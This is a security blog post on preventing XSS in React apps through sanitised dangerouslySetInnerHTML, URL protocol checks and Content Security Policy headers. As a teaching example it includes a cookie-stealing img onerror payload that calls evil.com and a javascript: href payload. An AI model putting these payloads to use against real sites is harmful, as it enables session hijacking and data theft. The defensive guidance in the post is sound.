---
title: "XSS in React: the one dangerous prop and the headers that block the rest."
description: "React escapes output by default, but one escape hatch can reintroduce XSS. Understand dangerouslySetInnerHTML, when it's legitimate, and the HTTP headers that provide defense in depth."
pubDate: 2024-07-29
tags: ["Security"]
draft: false
---

React's default behavior escapes all values rendered in JSX, which eliminates the most common class of XSS. Most React developers work for years without thinking about XSS because the framework handles it. But there is one deliberate escape hatch that reintroduces the vulnerability, and it's used more often than it should be.

## Why React is safe by default

When you render user-provided content in JSX:

```jsx
function Comment({ text }) {
  return <p>{text}</p>;
}
```

React calls `document.createTextNode()` internally, which treats the value as text, not HTML. Even if `text` is `<script>alert('xss')</script>`, it renders as the literal characters on screen, not as executable markup.

This protection applies to:
- JSX expressions: `{userContent}`
- Attribute values: `<input value={userInput} />`
- Dynamic class names: `<div className={userClass}>`

The browser never parses these values as HTML.

## dangerouslySetInnerHTML: the escape hatch

React provides one way to inject raw HTML:

```jsx
function RichTextDisplay({ htmlContent }) {
  return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}
```

The name is intentionally alarming. This sets `element.innerHTML` directly, which the browser parses as HTML including any scripts or event handlers. If `htmlContent` contains user-supplied data that hasn't been sanitized, you have XSS.

A real attack payload:

```html
<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

This doesn't even need `<script>` tags. The `onerror` event handler runs when the image fails to load, which it always does.

## When dangerouslySetInnerHTML is actually needed

Legitimate uses exist:
- Rendering content from a CMS that stores rich text as HTML
- Rendering markdown that has been converted to HTML server-side
- Embedding third-party widget HTML

The correct approach is to sanitize the HTML before rendering, not to skip sanitization:

```js
import DOMPurify from "dompurify";

function RichTextDisplay({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "br"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

DOMPurify parses the HTML and removes any tags or attributes that could execute code. It runs in the browser and uses the browser's own HTML parser, so it handles encoding tricks correctly. Always specify an allowlist (`ALLOWED_TAGS`) rather than a denylist.

## Other React XSS vectors

**href injection** is a less obvious one:

```jsx
// Dangerous if href comes from user input
<a href={userProvidedUrl}>Click here</a>
```

A user can provide `javascript:alert(document.cookie)` as a URL. React does not escape `javascript:` protocol values in `href`. Sanitize URLs before using them:

```js
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

function SafeLink({ href, children }) {
  return isSafeUrl(href) ? (
    <a href={href} rel="noopener noreferrer">{children}</a>
  ) : (
    <span>{children}</span>
  );
}
```

**eval and Function constructor** with user input — not React-specific, but worth mentioning. Never pass user input to `eval()`, `new Function()`, `setTimeout(string)`, or `setInterval(string)`.

## HTTP headers as defense in depth

Even with careful sanitization, Content Security Policy (CSP) limits what injected scripts can do:

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.yourapp.com;
  object-src 'none';
  base-uri 'self';
```

With this policy, even if an attacker injects a `<script>` tag, the browser refuses to execute it unless it loads from your own origin. `script-src 'self'` means only scripts from your domain run.

Set this in Express:

```js
import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yourapp.com"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    },
  })
);
```

Additional useful headers:

```js
app.use(helmet()); // Sets several security headers automatically
```

`X-Content-Type-Options: nosniff` prevents browsers from MIME-sniffing responses, which can lead to script execution from non-script responses.

`X-Frame-Options: DENY` prevents your pages from being embedded in iframes, blocking clickjacking attacks.

## The summary

React protects you by default. The risk surface is:
1. `dangerouslySetInnerHTML` with unsanitized content — sanitize with DOMPurify
2. `href` attributes with user-provided values — validate protocol
3. `eval` / dynamic code execution with user input — never do this

CSP as defense in depth reduces the impact of any XSS that does slip through.
